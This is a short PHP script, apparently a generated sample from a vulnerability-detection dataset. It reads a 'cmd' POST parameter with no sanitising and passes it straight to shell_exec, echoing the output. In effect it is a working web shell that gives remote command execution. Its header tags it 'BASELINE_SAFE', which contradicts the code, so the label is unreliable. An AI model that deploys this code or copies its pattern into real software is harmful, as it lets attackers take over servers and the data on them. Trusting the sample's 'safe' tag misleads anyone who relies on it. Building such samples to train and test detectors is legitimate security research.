<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_AKE; SKELETON=S1; KEY=cmd; SINK=B3; VAR=v0118 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$inp = array_key_exists("cmd", $_POST) ? (string)$_POST["cmd"] : "";
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B3($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
